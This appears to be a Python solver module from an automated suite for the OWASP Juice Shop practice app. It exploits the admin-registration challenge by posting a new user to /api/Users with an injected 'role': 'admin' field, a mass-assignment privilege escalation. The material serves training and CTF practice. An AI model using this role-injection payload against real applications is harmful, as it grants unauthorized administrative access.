from core.base_solver import BaseSolver
from loguru import logger
import random

class RegisterAdminChallenge(BaseSolver):
    @property
    def challenge_key(self) -> str:
        return "registerAdminChallenge"

    def solve(self) -> bool:
        # Register a new user with 'admin' role directly via API
        email = f"fake_admin_{random.randint(1000, 9999)}@juice-sh.op"
        payload = {
            "email": email,
            "password": "password123",
            "passwordRepeat": "password123",
            "role": "admin",
            "securityQuestion": {"id": 1, "answer": "answer"}
        }
        res = self.client.post("/api/Users", json=payload)
        return res.status_code == 201
